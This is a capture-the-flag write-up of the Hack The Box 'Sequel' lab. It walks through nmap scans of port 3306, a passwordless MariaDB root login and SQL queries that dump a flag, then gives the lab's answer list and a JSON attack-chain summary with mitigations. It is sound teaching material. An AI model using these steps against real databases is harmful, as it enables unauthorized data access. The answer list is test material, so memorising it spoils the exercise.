# HTB Sequel - MySQL/MariaDB Enumeration Playbook

Target theme:
- Database reconnaissance
- Weak/default credential exposure
- Data extraction from misconfigured service

Use only in authorized labs.

---

## 1. Objective

Move from service discovery to authenticated database access and controlled data extraction:
1. discover MySQL service,
2. validate credential hypothesis,
3. enumerate databases/tables,
4. recover target artifact.

---

## 2. Initial Enumeration

Quick port scan:

```bash
nmap -F <TARGET_IP>
```

Service and version scan:

```bash
nmap -sC -sV -p 3306 <TARGET_IP>
```

Expected key finding:
- 3306 open
- MariaDB service detected

---

## 3. Connect to Database

MySQL client uses -u to specify username.

```bash
mysql -h <TARGET_IP> -u root
```

If no password is requested or empty password works, this is a misconfiguration with high impact.

---

## 4. Database Enumeration Commands

Inside the SQL prompt:

```sql
show databases;
use htb;
show tables;
select * from config;
```

Notes:
- Use * (asterisk) to select all columns.
- End SQL statements with ;

---

## 5. Task Answer Summary

1) MySQL port:
- 3306

2) Community-developed version family:
- MariaDB

3) Switch to specify username in MySQL client:
- -u

4) Username that logs in without password in this lab:
- root

5) SQL symbol to display all columns:
- *

6) SQL statement terminator:
- ;

7) Unique extra database in this host:
- htb

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -p 3306 10.129.210.14
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MariaDB 10.x.x

analyst@kali:~$ mysql -h 10.129.210.14 -u root
Welcome to the MariaDB monitor.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| htb                |
+--------------------+

MariaDB [(none)]> use htb;
Database changed

MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
+---------------+

MariaDB [htb]> select * from config;
+----+-------------------------------+
| id | value                         |
+----+-------------------------------+
|  1 | HTB{...flag...}               |
+----+-------------------------------+
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "sequel_weak_mysql_auth",
	"input_signals": [
		"MySQL/MariaDB service exposed on 3306/tcp",
		"Root login accepted without password",
		"Non-default database htb discovered",
		"config table contains sensitive value"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Network Service Discovery",
			"confidence": 0.96,
			"evidence": "nmap found MariaDB on 3306"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Valid Accounts (Weak/Empty Password)",
			"confidence": 0.94,
			"evidence": "mysql root login succeeded without password"
		},
		{
			"step": 3,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.91,
			"evidence": "Data extracted from htb.config table"
		}
	],
	"hypotheses": [
		"Root password policy is absent or weak across additional DB nodes",
		"Application credentials may be stored in other tables or mysql.user metadata",
		"Credential reuse may allow SSH/web admin pivot"
	],
	"uncertainties": [
		"Privilege scope of root account across networked services not tested",
		"Unknown if remote root access is intended or accidental",
		"No evidence yet of audit logging on DB actions"
	],
	"tool_calls": [
		{"name": "db_schema_mapper", "priority": "high"},
		{"name": "db_credential_audit", "priority": "high"},
		{"name": "credential_reuse_probe", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Set strong password for root and disable remote root login",
			"Restrict 3306 exposure via firewall/ACL",
			"Rotate any credentials discovered in data"
		],
		"hardening": [
			"Enforce least-privilege DB accounts per application",
			"Require TLS for remote DB connections",
			"Implement secret manager-backed credential lifecycle"
		],
		"monitoring": [
			"Alert on root login from untrusted source IPs",
			"Monitor anomalous full-table reads",
			"Track schema/user permission drift"
		]
	}
}
```
